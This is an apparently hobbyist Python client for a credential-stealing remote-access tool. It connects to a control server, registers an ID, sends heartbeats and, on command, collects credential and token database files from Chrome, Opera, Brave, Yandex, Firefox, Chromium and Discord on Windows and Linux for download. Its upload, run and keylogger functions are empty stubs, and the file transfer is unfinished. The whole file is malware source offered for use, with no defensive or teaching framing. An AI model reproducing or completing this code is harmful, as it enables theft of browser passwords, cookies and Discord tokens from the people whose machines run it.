#!/usr/bin/env/ python3
import os
import platform
import subprocess
import socket
import multiprocessing
import time
import sys

control_address = ("localhost", 8080)

local = os.getenv("LOCALAPPDATA")
roaming = os.getenv("APPDATA")

# windows paths for credentials

paths_win = {
    "Discord": f"{roaming}\\Discord",
    "Discord Canary": f"{roaming}\\discordcanary",
    "Discord PTB": f"{roaming}\\discordptb",
    "Google Chrome": f"{local}\\Google\\Chrome\\User Data\\Default",
    "Opera": f"{roaming}\\Opera Software\\Opera Stable",
    "Brave": f"{local}\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex": f"{local}\\Yandex\\YandexBrowser\\User Data\\Default",
}
try:
    user = (
        subprocess.run("whoami", capture_output=True).stdout.decode("utf-8").strip("\n")
    )
except Exception:
    user = "not linux"

# linux paths for credentials, limited for now cause I can't be bothered
paths_tux = {
    "Firefox": f"/home/{user}/snap/firefox/common/.mozilla/firefox",
    "Chromium": f"/home/{user}/snap/chromium/common/chromium/Default",
    "Discord": f"/home/{user}/.config/discord/Local Storage/leveldb",
}

extensions_db = [".db", ".ldb", ".sqlite", ".sqlite-wal", ".log"]
extensions_full = [".txt", ".ldb", ".sqlite-wal", ".sqlite", ".json", ".db", ".log"]

mode = 0
CID = ""


def Start_Client():
    global mode
    global CID

    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(control_address)

            # Giving the client an ID for easy management
            filed = []
            for root, dirs, files in os.walk("."):
                for file in files:
                    filed.append(file)
            if ".CID" not in filed:
                print("no ID")
                sock.send("CID_req".encode())
                CID_r = sock.recv(1024)
                print(CID_r)
                with open(".CID", "w") as CID_f:
                    CID_f.write(CID_r.decode("utf-8"))

            if CID == "":
                CID = open(".CID", "r").read()

            time.sleep(1)
            sock.send(f"Got heartbeat from {CheckOS()} system with ID {CID}".encode())
            # sock.close()
        except Exception as E:
            print(E)
            sys.exit(1)

        command = sock.recv(4096).decode("utf-8")
        if command.__contains__(CID):
            if command.__contains__("Creds"):
                if command.__contains__("full"):
                    mode = 1
                else:
                    mode = mode

                t = GetBrowserCreds()

                sock.sendall(f"found {len(t)} files\nDownload(Y/n)".encode())
                time.sleep(2)
                confirmation = sock.recv(1024).decode("utf-8")
                if confirmation.upper() == "N":
                    sock.send("not downloading".encode())
                elif confirmation.upper() == "Y":
                    # read bytes from file and send
                    # requires the upload file function, coming soon (when I can be bothered)
                    pass
                else:
                    sock.send("Invaild operation...".encode())

        # sock.sendall(cred)
        # print(cred)


def CheckOS():
    os_type = platform.system()
    # subprocess.run("uname", capture_output=False)
    return os_type


def GetBrowserCreds():
    # checking what OS the program is being run on

    os_type = CheckOS()

    # grabbing creds from different directories based on system
    dbfiles = []
    if os_type == "Linux":
        for item, path in paths_tux.items():
            if not os.path.exists(path):
                continue
            directory = (
                subprocess.run(["ls", path], capture_output=True)
                .stdout.decode("utf-8")
                .split("\n")[0]
            )
            # print(os.path.join(path, directory))
            for root, dirs, files in os.walk(os.path.join(path, directory)):
                for file in files:
                    if mode == 1:
                        for extension in extensions_full:
                            if file.endswith(extension):
                                dbfiles.append(os.path.join(root, file))
                                # r = open(os.path.join(root, file), "rb")
                                # print(r)
                    else:
                        for extension in extensions_db:
                            if file.endswith(extension):
                                dbfiles.append(os.path.join(root, file))
                                # r = open(os.path.join(root, file), "rb")
                                # print(r)

    elif os_type == "Darwin":
        pass

    elif os_type == "Windows":
        for item, path in paths_win.items():
            if not os.path.exists(path):
                print("no path... smadge")
                continue
            directory = (
                subprocess.run(["dir", path], capture_output=True)
                .stdout.decode("utf-8")
                .split("\n")[0]
            )
            # print(os.path.join(path, directory))
            for root, dirs, files in os.walk(os.path.join(path, directory)):
                for file in files:
                    if mode == 1:
                        for extension in extensions_full:
                            if file.endswith(extension):
                                dbfiles.append(os.path.join(root, file))
                                # r = open(os.path.join(root, file), "rb")
                                # print(r)
                    else:
                        for extension in extensions_db:
                            if file.endswith(extension):
                                dbfiles.append(os.path.join(root, file))
                                # r = open(os.path.join(root, file), "rb")
                                # print(r)
    return dbfiles


def UploadFile():
    pass


def DownloadFile():
    pass


def Run():
    pass


def KeyLogger():
    pass


if __name__ == "__main__":
    try:
        Start_Client()
    except Exception as E:
        print(E)
        # sock.send(str(E).encode())
        sys.exit(1)
